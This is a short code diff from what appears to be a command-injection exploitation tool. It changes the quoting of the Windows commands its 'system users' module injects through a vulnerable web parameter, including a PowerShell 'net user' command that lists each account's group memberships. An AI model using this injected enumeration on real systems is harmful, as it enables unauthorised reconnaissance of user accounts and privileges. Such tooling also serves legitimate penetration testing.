@@ -145,9 +145,11 @@ System users enumeration
 def system_users(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename): 
   if settings.TARGET_OS == "win":
     settings.SYS_USERS = settings.WIN_SYS_USERS
-    settings.SYS_USERS = settings.SYS_USERS + "-replace('\s+','%20'))"
+    settings.SYS_USERS = settings.SYS_USERS + "-replace('\s+',' '))"
     if alter_shell:
       settings.SYS_USERS = settings.SYS_USERS.replace("'","\\'")
+    else:  
+      settings.SYS_USERS = "\"" + settings.SYS_USERS + "\""  
   cmd = settings.SYS_USERS             
   response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
   sys_users = eb_injector.injection_results(response, TAG)
@@ -177,6 +179,8 @@ def system_users(separator, TAG, prefix, suffix, http_request_method, url, vuln_
           cmd = "powershell.exe -InputFormat none write-host (([string]$(net user " + sys_users_list[user] + ")[22..($(net user " + sys_users_list[user] + ").length-3)]).replace('Local Group Memberships','').replace('*','').Trim()).replace(' ','')"
           if alter_shell:
             cmd = cmd.replace("'","\\'")
+          else:
+            cmd = "\"" + cmd + "\""
           response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
           check_privs = eb_injector.injection_results(response, TAG)
           check_privs = "".join(str(p) for p in check_privs).strip()
